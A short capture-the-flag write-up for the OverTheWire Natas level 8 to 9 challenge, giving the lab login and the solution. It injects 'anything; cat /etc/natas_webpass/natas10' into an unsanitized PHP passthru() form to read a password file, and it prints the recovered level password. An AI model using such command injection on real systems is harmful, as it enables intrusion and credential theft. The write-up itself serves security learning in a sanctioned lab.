# [Level 08 to 09](https://overthewire.org/wargames/natas/natas9.html) - 

- Login
```
URL: http://natas9.natas.labs.overthewire.org
Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```
- Exercise:
![image](https://github.com/user-attachments/assets/4c08799f-9545-46b7-aa8a-26ab048108d9)
![image](https://github.com/user-attachments/assets/a9611c67-0c0c-42bb-9c07-98bb292167bb)

- Background:
- Solution:
  - Form uses PHP `passthru()` function to run
  - Input is directly inserted into the command unsanitized
  - We can exploit this by injecting shell commands
  - Password for `natas10` is stored on the server at `/etc/natas_webpass/natas10`
  - Enter as the `needle` input: `anything; cat /etc/natas_webpass/natas10`
  - Input goes into shell like: `grep -i anything; cat /etc/natas_webpass/natas10 dictionary.txt`

![image](https://github.com/user-attachments/assets/03b8edc7-63e3-4d86-a7e5-52b632e0994e)

- Password: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
